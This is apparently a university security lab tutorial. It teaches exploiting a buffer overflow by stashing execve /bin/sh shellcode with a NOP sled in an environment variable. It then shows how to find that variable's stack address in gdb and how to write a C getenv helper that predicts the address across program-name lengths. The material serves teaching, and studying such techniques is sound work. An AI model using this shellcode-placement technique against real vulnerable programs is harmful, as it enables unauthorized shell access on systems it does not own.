# Exploit using the Environment

## Requirements

For this lab we will be using the default kali linux 2020.2 VM.

---

In the previous tutorials, we have seen how to exploit a buffer-overflow vulnerability by injecting shellcode directly into the buffer and overwriting the stack.

Sometimes we won't have the luxury to have a buffer long enough for our shellcodes. Indeed some shellcodes are more complex and can be up to 100 bytes long without the NOP sled and the return address.

To solve this issue we can stash our shellcode somewhere else in memory. 

While executing a program, the environment variables will be pushed on the stack so they can be accessed while the program is running. It seems like a perfect place to put some shellcode if we can find where in memory it sits.

## Adding environment variable

The first step is to create an env variable that contains our shellcode. We will first try with some dummy text, eg 'test', and see if we can see where it sits in memory.

This can be easily done with the `export` command :
```console
$ export MYVAR=hacked
$ echo $MYVAR
hacked
```

We can list the environment variables with the `env` command :
```console
$ env
SHELL=/bin/bash
MYVAR=hacked
PWD=/home/kali/Documents/Security/LINGI2144-2020-2021/env-variable
LOGNAME=kali
XDG_SESSION_TYPE=tty
HOME=/home/kali
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.0.2.2 51744 10.0.2.15 22
XDG_SESSION_CLASS=user
TERM=xterm-256color
USER=kali
SHLVL=1
XDG_SESSION_ID=5
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=10.0.2.2 51744 22
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/1
OLDPWD=/home/kali/Documents/Security/LINGI2144-2020-2021/shellcodes
_=/usr/bin/env
```
We can find our variable on the second line.

Of course we can also put some shellcode in an environment variable. We can use `$(cat ...)`to append our shellcode binary to a variable like this :

```console
$ export SHELLCODE=$(cat shellcode.bin)
$ echo $SHELLCODE
1?1?1ə??̀j
         XQh//shh/bin??Q??S??̀
```
❓This shellcode does not have a NOP sled so it would be hard to hit the right address. Add some NOP before your shellcode and save it in the $SHELLCODE variable.

Great we now need to find where in memory this shellcode is located. We can run our exploit program in `gdb` to inspect the stack.

❓Run the program on gdb, break at main, inspect the stack and find your env variable.

💡 HINT To inspect strings use `x/24s` instead of `x/**wx`. 

💡 HINT The environment variables are at a higher address so you might need to add some offset to the stack pointer.

<details>
  <summary>If you can't find it click here.</summary>
         
  ```console
  $ gdb -q exploit
  (gdb) b main
  (gdb) run AAAA
  Breakpoint 1, 0x00401216 in main ()
  (gdb) i r esp
  esp            0xbffff4b4          0xbffff4b4
  (gdb) x/24s $esp + 0x240
  0xbffff624:	"A"
  0xbffff626:	"SHELL=/bin/bash"
  0xbffff636:	"SHELLCODE=", '\220' <repeats 190 times>...
  0xbffff6fe:	"\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
  0xbffff72c:	"MYVAR=hacked"
  0xbffff739:	"PWD=/home/kali/Documents/Security/LINGI2144-2020-2021/env-variable"
  0xbffff77c:	"LOGNAME=kali"
  [...]
  ```
         
</details>

Now that you have located your variable you can pick an address in the middle of your NOP sled. For me a suitable address is : 0xbffff69a

<details>
  <summary>If you can't find a suitable address click here.</summary>
         
  Once you have your variable address you can go to the middle of the sled by adding an offset.
  
  ```console
  (gdb) x/s 0xbffff636
  0xbffff636:	"SHELLCODE=", '\220' <repeats 190 times>...
  (gdb) x/s 0xbffff636 + 100
  0xbffff69a:	'\220' <repeats 110 times>, "\061\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
  ```
  
  0xbffff69a will be my address.
</details>

So if we run our vulnerable program with the address of our shellcode repeated in a large amount we should hit the `EIP`and execute our shellcode.

❓ Spawn a shell using the environment variable.


## Go even further

That's cool but that's a bit trivious because we still need to guess the shellcode's address. Hopefully there is a system call that will help us great time by giving us the address of the environment variable at runtime : `getenv` !

❓ Write a small piece of C code that takes an environment variable as input and prints its address. 

Eg :
```console
$ ./getenv SHELLCODE
SHELLCODE is at 0xbffff636
```

When you got your little helper you can check if the exploit still works with the given address.

❓ Exploit the vulnerable program using the given address.

### Sledless

That's good but our shellcode is still a bit long with all those NOP ops at the beginning so let's try to remove them !

❓ Put into SLEDLESS your shellcode without NOP sled.

❓ Use your helper to fetch the address of SLEDLESS and try to spawn a shell.

Whoops it seems the address is not correct anymore. We should try to invesigate what could cause the address to change when running another program (the helper). 

❓ Change the name of your helper binary and fetch the address of the shellcode. Try different lengths for example.

❓ Try to found a pattern between the addresses that you get.

<details>
  <summary>If you can't find a the pattern click here.</summary>
         
  ```console
$ cp a.out a
$ ./a SLEDLESS
SLEDLESS will be at 0xbffffea1
$ cp a.out bb
$ ./bb SLEDLESS
SLEDLESS will be at 0xbffffe9f
$ cp a.out ccc
$ ./ccc SLEDLESS
SLEDLESS will be at 0xbffffe9d
  ```
  
  If you look closely you can see that when we make the name of the program longer, the address decreases. Between `./ccc` and `./bb` we got `0xbffffe9f - 0xbffffe9d = 2 bytes` and the same amount between `./bb` and `./a`. It looks like we decrease the address by two bytes for every additionnal char in the program name.
</details>

When you think you found the pattern you can edit your previously used helper to predict the right address of the shellcode.

❓ Write a C program that successfully predict the shellcode's address.

💡 HINT It might seem a bit hard so here are the steps if you are stuck :
<details>
  <summary>If you can't predict the address click here.</summary> 
         
- store the address of the shellcode in a pointer
         
- compute the difference of length between your helper program name and your vulnerable program name

- multiply the difference with the pattern you found previously

- add the result to your shellcode address.
         
**Explanation** When we fetch the shellcode's address from our helper program (let's say `./getenvaddr`) we first need to remove the length of this program name from the shellcode's address. Then we need to add the length of our vulnerable program name.
```C
char *ptr;
ptr = getenv(argv[1]);
ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
/**               │                 │        │
*            ./getenvaddr      ./exploit   pattern        
*              12 bytes          9 bytes   2 bytes
*                 └────────┬────────┘        │
*                       3 bytes              │
*                          └────────┬────────┘
*                                6 bytes
*/
```
</details>


❓ Spawn a shell using the predicted shellcode's address.
